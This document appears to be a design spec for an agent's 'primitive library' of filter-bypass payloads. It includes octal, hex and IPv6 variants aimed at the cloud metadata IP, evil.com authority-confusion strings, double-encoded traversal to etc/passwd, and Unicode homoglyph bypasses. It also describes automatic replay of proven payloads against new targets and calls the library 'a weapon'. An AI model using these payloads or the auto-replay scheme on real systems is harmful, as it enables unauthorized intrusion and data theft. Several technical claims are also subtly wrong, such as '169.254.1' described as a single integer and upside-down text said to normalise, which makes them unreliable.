# GHOST ARCHITECT — Primitive Library
## Living Bypass & Mutation Database

---

### PRIMITIVE SCHEMA

Every primitive in this library follows this exact structure:

```json
{
  "primitive_id": "PRIM-XXX",
  "name": "Human-readable name",
  "category": "Encoding / Parser-Differential / SSRF-Bypass / Auth-Bypass / Logic-Flaw / Other",
  "description": "What this primitive does and why it works",
  "root_cause": "The fundamental misunderstanding or weakness this exploits",
  "target_conditions": {
    "technologies": ["e.g., Python urllib", "Java Spring", "Cloudflare"],
    "vulnerability_classes": ["SSRF", "Open-Redirect", "Path-Traversal"],
    "indicators": ["What signals this primitive might work"]
  },
  "base_payload": "The core bypass string",
  "mutations": [
    {
      "mutation_id": "PRIM-XXX-M01",
      "variant": "Specific mutation",
      "encoding_applied": "URL-encode / Double-encode / Hex / Unicode / etc.",
      "when_to_use": "Context where this variant applies"
    }
  ],
  "success_history": [
    {
      "target": "Program name or domain",
      "endpoint": "/specific/path",
      "result": "Confirmed / Potential / Failed",
      "bounty": "$0",
      "date": "YYYY-MM-DD",
      "notes": "What made it work here"
    }
  ],
  "cross_pollination": [
    {
      "vulnerability_class": "SQLi / XSS / Command-Injection / etc.",
      "hypothesis": "Why this primitive might work here",
      "tested": false,
      "result": null
    }
  ],
  "related_primitives": ["PRIM-YYY", "PRIM-ZZZ"],
  "source": "Who discovered this and where",
  "date_added": "YYYY-MM-DD",
  "last_updated": "YYYY-MM-DD"
}
```

---

### EXAMPLE PRIMITIVES

#### PRIM-001: Octal IP Encoding (SSRF Bypass)
```json
{
  "primitive_id": "PRIM-001",
  "name": "Octal IP Encoding for SSRF Bypass",
  "category": "SSRF-Bypass",
  "description": "Encoding the first octet of an IP address in octal format bypasses naive SSRF filters that only check for decimal dotted-quad notation.",
  "root_cause": "IP parsers accept multiple notations (decimal, octal, hex) but SSRF filters often only validate decimal format.",
  "target_conditions": {
    "technologies": ["Python urllib", "PHP curl", "Node.js url.parse (legacy)"],
    "vulnerability_classes": ["SSRF", "Open-Redirect"],
    "indicators": ["Filter blocks 169.254.x.x but doesn't normalize input", "SSRF protection uses regex for IP validation"]
  },
  "base_payload": "0251.254.169.254",
  "mutations": [
    {
      "mutation_id": "PRIM-001-M01",
      "variant": "0251.254.169.254",
      "encoding_applied": "Octal first octet only",
      "when_to_use": "Target parses full IP but filter checks decimal regex"
    },
    {
      "mutation_id": "PRIM-001-M02",
      "variant": "0251.254.0251.0376",
      "encoding_applied": "Octal all octets",
      "when_to_use": "Target parser accepts full octal notation"
    },
    {
      "mutation_id": "PRIM-001-M03",
      "variant": "0xA9.0xFE.169.254",
      "encoding_applied": "Hex mixed with decimal",
      "when_to_use": "Parser accepts hex octets"
    },
    {
      "mutation_id": "PRIM-001-M04",
      "variant": "169.254.1",
      "encoding_applied": "Dotless decimal (single integer)",
      "when_to_use": "Parser accepts integer representation of IP"
    },
    {
      "mutation_id": "PRIM-001-M05",
      "variant": "[::ffff:169.254.169.254]",
      "encoding_applied": "IPv6-mapped IPv4",
      "when_to_use": "Target accepts IPv6 format but resolves to IPv4 internal"
    },
    {
      "mutation_id": "PRIM-001-M06",
      "variant": "http://0251.254.169.254/latest/meta-data/",
      "encoding_applied": "Octal + path traversal",
      "when_to_use": "AWS metadata service target"
    },
    {
      "mutation_id": "PRIM-001-M07",
      "variant": "0251.254.169.254@evil.com",
      "encoding_applied": "Octal + authority confusion",
      "when_to_use": "Parser uses different library for validation vs request"
    },
    {
      "mutation_id": "PRIM-001-M08",
      "variant": "evil.com.0251.254.169.254",
      "encoding_applied": "Octal + DNS suffix",
      "when_to_use": "Filter checks suffix but parser resolves octal IP"
    }
  ],
  "success_history": [
    {
      "target": "Yahoo (historical)",
      "endpoint": "/api/fetch",
      "result": "Confirmed",
      "bounty": "$180000",
      "date": "2018-XX-XX",
      "notes": "Applied across 18 endpoints in single session"
    }
  ],
  "cross_pollination": [
    {
      "vulnerability_class": "Open-Redirect",
      "hypothesis": "Redirect validation may also only check decimal IP format",
      "tested": false,
      "result": null
    },
    {
      "vulnerability_class": "Command-Injection",
      "hypothesis": "curl/wget commands in backend may accept octal IPs where filter does not",
      "tested": false,
      "result": null
    }
  ],
  "related_primitives": ["PRIM-002", "PRIM-003"],
  "source": "Tommy DeVoss (dawgyg) — Yahoo SSRF session",
  "date_added": "2026-04-27",
  "last_updated": "2026-04-27"
}
```

---

#### PRIM-002: URL Double-Encoding Path Traversal
```json
{
  "primitive_id": "PRIM-002",
  "name": "Double-URL-Encoding Path Traversal",
  "category": "Parser-Differential",
  "description": "Double-encoding path traversal sequences bypasses filters that decode once but pass the result to a secondary parser that decodes again.",
  "root_cause": "Multiple decoding stages with validation between them. Filter checks after first decode, but filesystem reads after second decode.",
  "target_conditions": {
    "technologies": ["Java servlets", "Apache mod_rewrite", "Nginx with lua"],
    "vulnerability_classes": ["Path-Traversal", "LFI", "RFI"],
    "indicators": ["Filter blocks ../ but application still behaves differently with encoded input", "Multiple layers of routing/proxy"]
  },
  "base_payload": "%252e%252e%252f",
  "mutations": [
    {
      "mutation_id": "PRIM-002-M01",
      "variant": "%252e%252e%252f",
      "encoding_applied": "Double URL encode of ../",
      "when_to_use": "Two-stage decode pipeline"
    },
    {
      "mutation_id": "PRIM-002-M02",
      "variant": "%252e%252e%252fetc%252fpasswd",
      "encoding_applied": "Double encode full path",
      "when_to_use": "LFI targets"
    },
    {
      "mutation_id": "PRIM-002-M03",
      "variant": "..%252f..%252f",
      "encoding_applied": "Mixed single/double encode",
      "when_to_use": "Partial decode at first stage"
    },
    {
      "mutation_id": "PRIM-002-M04",
      "variant": "%252e%252e%255c",
      "encoding_applied": "Double encode Windows backslash variant",
      "when_to_use": "Windows-based targets"
    },
    {
      "mutation_id": "PRIM-002-M05",
      "variant": "%252e%252e%252f%252e%252e%252f",
      "encoding_applied": "Double encode deep traversal",
      "when_to_use": "Need to escape multiple directory levels"
    }
  ],
  "success_history": [],
  "cross_pollination": [
    {
      "vulnerability_class": "SSRF",
      "hypothesis": "URL parsers in SSRF contexts may also have multi-stage decode",
      "tested": false,
      "result": null
    }
  ],
  "related_primitives": ["PRIM-003"],
  "source": "Common technique — multiple researchers",
  "date_added": "2026-04-27",
  "last_updated": "2026-04-27"
}
```

---

#### PRIM-003: Unicode Normalization Bypass
```json
{
  "primitive_id": "PRIM-003",
  "name": "Unicode Normalization Auth/Filter Bypass",
  "category": "Parser-Differential",
  "description": "Using Unicode homoglyphs or composed characters that normalize to dangerous characters after Unicode normalization (NFC/NFKC).",
  "root_cause": "Filter operates on raw bytes but backend normalizes Unicode before processing, transforming 'safe' characters into dangerous ones.",
  "target_conditions": {
    "technologies": ["Python 3", "Node.js", "Any system with Unicode normalization"],
    "vulnerability_classes": ["Auth-Bypass", "Path-Traversal", "Command-Injection", "SQLi"],
    "indicators": ["Application accepts Unicode input", "Different behavior between similar-looking characters", "Internationalized domain names or usernames"]
  },
  "base_payload": "ℂℍℙℚℝℤ (mathematical bold characters)",
  "mutations": [
    {
      "mutation_id": "PRIM-003-M01",
      "variant": "ａｄｍｉｎ (fullwidth characters)",
      "encoding_applied": "Fullwidth ASCII variants",
      "when_to_use": "Username/email filters"
    },
    {
      "mutation_id": "PRIM-003-M02",
      "variant": "ℂℍℙℚℝℤ (mathematical bold)",
      "encoding_applied": "Mathematical alphanumeric symbols",
      "when_to_use": "Command injection where letters are filtered"
    },
    {
      "mutation_id": "PRIM-003-M03",
      "variant": "ǝɯɐuɹǝs∩ (upside-down text)",
      "encoding_applied": "Unicode upside-down variants",
      "when_to_use": "Keyword filters"
    },
    {
      "mutation_id": "PRIM-003-M04",
      "variant": "ѕеlесt (Cyrillic lookalikes)",
      "encoding_applied": "Cyrillic homoglyphs for Latin letters",
      "when_to_use": "SQLi keyword filters"
    }
  ],
  "success_history": [],
  "cross_pollination": [
    {
      "vulnerability_class": "XSS",
      "hypothesis": "Script tag filters may not catch Unicode variants of < and >",
      "tested": false,
      "result": null
    }
  ],
  "related_primitives": ["PRIM-002"],
  "source": "Multiple researchers — Unicode security research",
  "date_added": "2026-04-27",
  "last_updated": "2026-04-27"
}
```

---

### PRIMITIVE DISCOVERY WORKFLOW

When your agent discovers a new bypass or trick:

1. **Assign Primitive ID** — `PRIM-XXX` (incremental)
2. **Document Root Cause** — What fundamental misunderstanding makes this work?
3. **Generate 10+ Mutations** — Different encodings, contexts, combinations
4. **Define Target Conditions** — When should this primitive be replayed?
5. **Queue Cross-Pollination** — What other vuln classes might this affect?
6. **Replay Globally** — Test against all matching endpoints in current target
7. **Update Success History** — Log results for future confidence scoring
8. **Link Related Primitives** — Build a web of connected techniques

---

### CONFIDENCE SCORING

Each primitive has a dynamic confidence score:

```
Confidence = (Confirmed_Successes × 2) + (Potential_Findings × 1) - (Failures × 0.5)
```

Primitives with confidence > 5 get auto-replayed on new targets matching their conditions.
Primitives with confidence < -3 get archived but not deleted.

---

### CROSS-POLLINATION QUEUE

The agent maintains an active queue of cross-pollination hypotheses:

| Primitive | Test Against | Priority | Status |
|-----------|-------------|----------|--------|
| PRIM-001 | Open-Redirect | High | Pending |
| PRIM-001 | Command-Injection | Medium | Pending |
| PRIM-002 | SSRF | Medium | Pending |
| PRIM-003 | XSS | High | Pending |

---

*"One primitive is a trick. A library of primitives with mutations and cross-pollination is a weapon."*
